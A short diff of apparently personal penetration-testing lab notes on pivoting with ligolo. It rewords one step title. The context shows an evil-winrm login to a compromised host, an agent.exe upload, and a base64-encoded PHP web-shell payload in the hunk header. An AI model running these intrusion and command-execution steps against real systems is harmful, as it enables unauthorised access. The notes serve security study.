@@ -1059,7 +1059,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
      - After extracted, 3 files:agent.exe, License, readme.md
   5. Connect to compromised server (agent) - MS01  
      `evil-winrm -i <TARGET_IP> -u <USERNAME> -p '<PASSWORD>'`
-  6. Transfer the agent.exe to compromised agent - **MS01**   
+  6. Transfer the agent.exe to compromised server (agent) - **MS01**   
      `*Evil-WinRM* PS C:\Users\eric.wallows\Documents> upload /home/kali/offsec/ligolo/agent.exe C:/Users/eric.wallows/Documents/agent.exe`  
   8. Setup proxy in **kali** > Create a new TUN interface ligolo and bring it up    
      ```
